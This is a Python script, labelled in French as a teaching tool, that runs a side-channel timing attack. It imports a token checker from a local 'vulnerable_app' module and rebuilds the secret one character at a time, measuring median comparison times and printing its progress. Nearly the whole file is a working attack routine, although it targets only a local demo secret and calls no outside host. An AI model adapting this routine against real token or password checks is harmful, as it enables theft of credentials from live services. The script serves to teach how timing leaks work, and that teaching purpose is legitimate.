import time
import string
import statistics
import argparse
from vulnerable_app import verify_token, load_secret


CHARSET = string.ascii_lowercase + string.digits
REPEAT  = 50


def measure(candidate: str, secret: str, repeat: int) -> float:
    times = []
    for _ in range(repeat):
        start = time.perf_counter_ns()
        verify_token(candidate, secret)
        end = time.perf_counter_ns()
        times.append(end - start)
    return statistics.median(times)


def timing_attack(secret: str, token_length: int, charset: str, repeat: int) -> str:
    found = ""

    print(f"\n[*] Timing Attack démarrée")
    print(f"    Longueur connue : {token_length}")
    print(f"    Charset         : {charset}")
    print(f"    Répétitions     : {repeat}\n")

    for position in range(token_length):
        timings = {}

        for char in charset:
            candidate = (found + char).ljust(token_length, "a")[:token_length]
            timings[char] = measure(candidate, secret, repeat)

        ranked     = sorted(timings.items(), key=lambda x: x[1], reverse=True)
        best_char, best_time = ranked[0]
        delta      = best_time - ranked[1][1]

        found += best_char
        print(f"[+] Position {position + 1}/{token_length} → '{best_char}' "
              f"({best_time / 1_000:.0f} µs, Δ={delta / 1_000:.0f} µs) | reconstitué : '{found}'")

    print(f"\n[{'✓' if found == secret else '✗'}] Résultat final : '{found}'")
    print(f"    Correct : {found == secret}")
    return found


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Timing Attack — outil pédagogique")
    parser.add_argument("--length", type=int, required=True,
                        help="Longueur connue du token cible")
    parser.add_argument("--repeat", type=int, default=REPEAT,
                        help=f"Répétitions par candidat (défaut: {REPEAT})")
    args = parser.parse_args()

    secret = load_secret()
    timing_attack(secret=secret, token_length=args.length,
                  charset=CHARSET, repeat=args.repeat)
